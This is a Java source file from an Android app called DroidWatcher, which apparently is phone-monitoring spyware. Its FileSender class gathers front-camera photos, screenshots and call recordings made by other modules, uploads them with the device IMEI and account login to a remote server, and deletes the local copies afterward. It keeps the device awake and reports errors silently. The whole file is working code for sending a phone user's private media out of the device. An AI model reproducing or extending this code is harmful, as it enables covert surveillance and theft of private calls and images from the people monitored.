package com.droidwatcher;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;

import org.acra.ACRA;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.ServerConst;
import com.droidwatcher.modules.CameraModule;
import com.droidwatcher.modules.PhotoModule;
import com.droidwatcher.modules.RecorderModule;
import com.droidwatcher.modules.ScreenshotModule;
import com.droidwatcher.services.AppService;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiManager.WifiLock;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

public class FileSender extends Thread {
	private Context mContext;
	private SettingsManager mSettings;
	private FileType mType;
	
	private WakeLock mWakeLock;
	private WifiLock mWifiLock;
	
	private static final long MAX_ATTACHMENT_SIZE = 10 * 1024 * 1024;
	private static final long MAX_FILE_SIZE = 15 * 1024 * 1024;
	private static final long MIN_FILE_SIZE = 1024;
	
	public FileSender(Context context, FileType type){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mType = type;
		
		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DW_WAKELOCK");
		WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
		mWifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL, "DW_WIFILOCK");
	}
	
	@Override
	public synchronized void start() {
		if (AppService.sThreadManager != null) {
			AppService.sThreadManager.addTask(this);
		}
		else{
			Thread.currentThread().setName("[FileSender ("+ mType.name() +")]");
			super.start();
		}
	};
	
	@Override
	public void run(){
		if (!networkAvailable()) {
			return;
		}
		
		if (mType == FileType.RECORD && RecorderModule.isRecording) {
			return;
		}
		
		try {
			acquireWakeLock();
			
			File[] files = getFiles();
			if (files == null || files.length == 0) {
				return;
			}
			
			switch (mType) {
			case PHOTO:
			case RECORD:
				break;
			case SCREENSHOT:
			case FRONT_CAMERA_PHOTO:
				if (files.length < 10) {
					return;
				}
				break;
			default:
				break;
			}
			
			long currentLength = 0;
			ArrayList<File> fileList = new ArrayList<File>(10);
			long length = 0;
			for (int i = 0; i < files.length; i++) {
				length = files[i].length();
				
				if (length < MIN_FILE_SIZE || length > MAX_FILE_SIZE) {
					files[i].delete();
					continue;
				}
				
				if (currentLength >= MAX_ATTACHMENT_SIZE || (fileList.size() > 0 && currentLength + length >= MAX_ATTACHMENT_SIZE) || fileList.size() >= 10) {
					sendAndDelete(fileList);
					
					fileList = new ArrayList<File>(10);
					currentLength = 0;
				}
				
				fileList.add(files[i]);
				currentLength += length;
			}
			
			if (fileList.size() > 0) {
				sendAndDelete(fileList);
			}
			
		}
		catch (Exception e){
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			releaseWakeLock();
		}
	}
	
	private void acquireWakeLock(){
		try {
			if (mWakeLock != null && !mWakeLock.isHeld()) {
				mWakeLock.acquire();
			}
			if (mWifiLock != null && !mWifiLock.isHeld()) {
				mWifiLock.acquire();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			//ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void releaseWakeLock(){
		try {
			if (mWakeLock != null && mWakeLock.isHeld()) {
				mWakeLock.release();
			}
			if (mWifiLock != null && mWifiLock.isHeld()) {
				mWifiLock.release();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			//ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void sendAndDelete(ArrayList<File> files){
		if (sendFiles(files)) {
			for (File file : files) {
				if (Debug.DEBUG) {
					Debug.i("File " + file.getName() + " deleted: " + file.delete());
				}
				else{
					file.delete();
				}
			}
		}
	}
	
	private Boolean sendFiles(ArrayList<File> files){
		try {
		    HttpClient httpClient = new DefaultHttpClient();
		    HttpPost httpPost = new HttpPost(getServerAddress());
		    
		    httpPost.addHeader("X-DW-LOGIN", mSettings.login());
		    httpPost.addHeader("X-DW-IMEI", mSettings.imei());

            MultipartEntity multipartEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
            multipartEntity.addPart("params", new StringBody(getParams()));
            for (int i = 0; i < files.size(); i++) {
				multipartEntity.addPart("file_" + i, new FileBody(files.get(i)));
			}
			httpPost.setEntity(multipartEntity);

			HttpResponse response = httpClient.execute(httpPost);
            
			if (response == null){
		    	return false;
		    }
		    
			HttpEntity entity = response.getEntity();
				
			if (entity == null) {
				return false;
			}
			
			String data = EntityUtils.toString(entity, "UTF-8");
            
            return data.equals(ServerConst.OK);

		} catch(IOException e){
			Debug.exception(e);
		}
		catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		
		return false;
	}
	
	private String getServerAddress(){
		switch (mType) {
			case PHOTO:
				return ServerMessanger.SERVER_ADDRESS + "Photo";
			case FRONT_CAMERA_PHOTO:
				return ServerMessanger.SERVER_ADDRESS + "FrontCamera";
			case RECORD:
				return ServerMessanger.SERVER_ADDRESS + "Rec_new";
			case SCREENSHOT:
				return ServerMessanger.SERVER_ADDRESS + "Screen";
			default:
				return ServerMessanger.SERVER_ADDRESS;
		}
	}
	
	private String getParams() throws JSONException{
		JSONObject obj = new JSONObject()
			.put("login", mSettings.login())
			.put("imei", mSettings.imei());
		return obj.toString();
	}
	
	private File[] getFiles(){
		if (!FileUtil.isExternalStorageAvailable()) {
			return null;
		}
		
		File external = mContext.getExternalFilesDir(null);
		
		if (external == null) {
			return null;
		}
		
		return new File(external.getAbsolutePath() + "/").listFiles(filter);
	}
	
	private Boolean networkAvailable(){
		SettingsManager settings = new SettingsManager(mContext);
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if ((settings.filesOnlyWiFi() || settings.onlyWiFi()) && info.getType() != ConnectivityManager.TYPE_WIFI) {
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
	
	private FilenameFilter filter = new FilenameFilter() {
		@Override
		public boolean accept(File dir, String filename) {
			switch (mType) {
				case PHOTO:
					return filename.endsWith(".jpg") && filename.startsWith(PhotoModule.PREFIX);
				case FRONT_CAMERA_PHOTO:
					return filename.endsWith(".jpg") && filename.startsWith(CameraModule.PREFIX);
				case RECORD:
					//return filename.endsWith(".3gp") || filename.endsWith(".amr");
					return filename.startsWith(RecorderModule.CALL_PREFIX) || filename.startsWith(RecorderModule.RECORD_PREFIX);
				case SCREENSHOT:
					return filename.endsWith(".jpg") && filename.startsWith(ScreenshotModule.PREFIX);
			}
			return false;
		}
	};
	
	public enum FileType{
		PHOTO, SCREENSHOT, RECORD, FRONT_CAMERA_PHOTO;
	}
}
